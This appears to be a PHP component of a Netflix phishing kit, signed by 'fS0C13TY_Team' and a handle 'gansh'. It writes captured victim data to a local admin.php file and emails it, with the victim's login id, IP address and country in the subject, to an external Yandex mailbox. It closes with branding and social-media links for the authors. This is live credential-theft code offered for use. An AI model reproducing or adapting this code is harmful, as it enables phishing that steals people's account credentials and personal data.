<?php
/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * NETFLIX -
 * version 01
 * icq & telegram = @gnash
 
###############################################
#$            C0d3d by fS0C13TY_Team         $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 NETFLIX           $#
###############################################

**/
$yourmail  = 'gansh.ppl@yandex.com';

$f = fopen("../../admin.php", "a");
	fwrite($f, $msgbank);

$subject  = " ".$_SESSION['iduserLoginId']." / ".$_SERVER['REMOTE_ADDR']." / ".$_SESSION['country1']." ";
$headers .= "From: Netflix" . "\r\n";
mail($yourmail, $subject, $yagmail, $headers);


$Our_Name = "gansh🖕🤡🖕" ; 

$Name_page = "💖Netflix By gansh💖" ;

$JoinUs_On_youtube = "https://www.youtube.com/channel/UCLnz5ZLUsHccLgXVLa5vv9w";

$JoinUs_On_Facebook = "https://www.facebook.com/FsocietyZone/";

$JoinUs_On_telegram = "https://t.me/FUCKTOS0C13TY";



?>